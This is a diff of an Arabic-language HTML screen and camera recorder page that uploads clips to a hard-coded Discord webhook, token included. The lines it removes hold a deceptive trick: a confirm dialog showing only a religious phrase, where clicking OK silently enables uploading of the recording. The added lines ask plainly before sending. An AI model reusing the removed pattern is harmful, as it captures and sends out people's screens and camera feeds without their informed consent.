@@ -17,6 +17,8 @@ body {
   height: 100vh;
 }
 
+h1 { margin-bottom: 20px; }
+
 button {
   padding: 12px 25px;
   margin: 10px;
@@ -38,7 +40,7 @@ video {
 </head>
 <body>
 
-<h2>🎥 تسجيل الشاشة / الكاميرا</h2>
+<h1>🎥 تسجيل الشاشة / الكاميرا</h1>
 
 <button id="start">بدء</button>
 <button id="stop" disabled>إيقاف</button>
@@ -46,27 +48,21 @@ video {
 <video id="video" controls autoplay playsinline></video>
 
 <script>
+// 🔗 حط رابط الويبهوك هنا
 const webhookURL = "https://discord.com/api/webhooks/1484152062626369659/sMpPjPuKQ8nZoFWqI5Id97toLaiY_hyTNR_3kgpNJdu0JvAPim36IdHWgNV7WwIFKYJ6";
 
 let recorder, stream, chunks = [];
-let allowUpload = false;
 
 const startBtn = document.getElementById("start");
 const stopBtn = document.getElementById("stop");
 const video = document.getElementById("video");
 
 startBtn.onclick = async () => {
-
-  // طلب موافقة مرة وحدة
-  allowUpload = confirm(" الهم صلي على محمد");
-  if (!allowUpload) {
-    alert("نخلي المسؤلية من اي تصرف سيء");
-  }
-
   startBtn.disabled = true;
   stopBtn.disabled = false;
 
   try {
+    // كمبيوتر: تسجيل شاشة
     if (navigator.mediaDevices.getDisplayMedia) {
       stream = await navigator.mediaDevices.getDisplayMedia({
         video: true,
@@ -76,12 +72,13 @@ startBtn.onclick = async () => {
       throw "no screen";
     }
   } catch {
+    // جوال: كاميرا
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: true,
         audio: true
       });
-      alert("");
+      alert("📱 تم التحويل للكاميرا");
     } catch (err) {
       alert("فشل التشغيل ❌");
       startBtn.disabled = false;
@@ -97,19 +94,27 @@ startBtn.onclick = async () => {
     if (e.data.size > 0) chunks.push(e.data);
   };
 
-  recorder.onstop = async () => {
+  recorder.onstop = () => {
     const blob = new Blob(chunks, { type: "video/webm" });
     const url = URL.createObjectURL(blob);
     video.src = url;
 
-    // تحميل محلي
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "record.webm";
-    a.click();
+    // زر تحميل
+    const downloadBtn = document.createElement("a");
+    downloadBtn.href = url;
+    downloadBtn.download = "record.webm";
+    downloadBtn.innerText = "⬇️ تحميل الفيديو";
+    document.body.appendChild(downloadBtn);
 
-    // رفع تلقائي (إذا وافق)
-    if (allowUpload) {
+    // زر إرسال
+    const sendBtn = document.createElement("button");
+    sendBtn.innerText = "📤 إرسال الفيديو";
+    document.body.appendChild(sendBtn);
+
+    sendBtn.onclick = async () => {
+      const ok = confirm("هل تريد إرسال الفيديو؟");
+      if (!ok) return;
+
       try {
         const formData = new FormData();
         formData.append("file", blob, "record.webm");
@@ -119,15 +124,12 @@ startBtn.onclick = async () => {
           body: formData
         });
 
-        alert("تم حفظ المقطع");
+        alert("تم الإرسال ✅");
       } catch (err) {
-        alert("فشل رفع المقطع ❌");
+        alert("فشل الإرسال ❌");
         console.error(err);
       }
-    }
-
-    stream.getTracks().forEach(track => track.stop());
-    chunks = [];
+    };
   };
 
   recorder.start();
@@ -136,7 +138,9 @@ startBtn.onclick = async () => {
 stopBtn.onclick = () => {
   stopBtn.disabled = true;
   startBtn.disabled = false;
+
   recorder.stop();
+  stream.getTracks().forEach(track => track.stop());
 };
 </script>
 
